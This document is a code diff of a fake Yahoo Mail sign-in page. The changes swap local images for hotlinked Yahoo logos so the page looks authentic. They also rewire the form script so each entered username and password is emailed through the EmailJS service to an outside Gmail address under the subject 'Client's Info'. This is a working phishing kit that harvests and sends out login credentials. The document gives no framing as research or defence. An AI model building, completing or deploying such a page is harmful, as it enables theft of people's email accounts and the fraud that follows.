@@ -3,7 +3,11 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+    <link
+      rel="shortcut icon"
+      href="https://icons.iconarchive.com/icons/designbolts/cute-social-2014/256/Yahoo-icon.png"
+      type="image/x-icon"
+    />
     <link
       href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700&family=Lexend+Deca&family=Raleway:wght@400;600&display=swap"
       rel="stylesheet"
@@ -183,7 +187,11 @@
   </head>
   <body>
     <nav>
-      <img src="logo.png" alt="" width="120px" />
+      <img
+        src="https://logos-world.net/wp-content/uploads/2020/10/Yahoo-Logo.png"
+        alt=""
+        width="120px"
+      />
       <a href="">Help</a>
     </nav>
     <div class="container">
@@ -196,7 +204,11 @@
         </p>
       </div>
       <form action="mailto:abc@example.com" method="POST">
-        <img src="logo.png" alt="" width="100px" />
+        <img
+          src="https://logos-world.net/wp-content/uploads/2020/10/Yahoo-Logo.png"
+          alt=""
+          width="100px"
+        />
         <div class="text">
           <h3>Sign in to Yahoo Mail</h3>
           <small>Using your Yahoo account</small>
@@ -282,9 +294,8 @@
     });
 
     function sendEmail(to, subject, message) {
-      // Replace "your_email_template_id" with the actual template ID from EmailJS
       emailjs
-        .send("gmail", "service_zeoeorp", {
+        .send("service_g1hvjdp", "template_ydtlwut", {
           to_email: to,
           subject: subject,
           message: message,
@@ -330,15 +341,15 @@
             }, 3000);
           } else {
             pWord = password.value;
-            console.log(uName, pWord);
-            // window.location.replace(
-            //   `http://127.0.0.1:5500/index.html?username=${uName}&passsword=${pWord}`
-            // );
             let message = {
               username: uName,
               password: pWord,
             };
-            sendEmail("ejovwogfreeman007@gmail.com", "Client's Info", message);
+            sendEmail(
+              "ejovwogfreeman007@gmail.com",
+              "Client's Info",
+              JSON.stringify(message)
+            );
             form.reset();
           }
         });
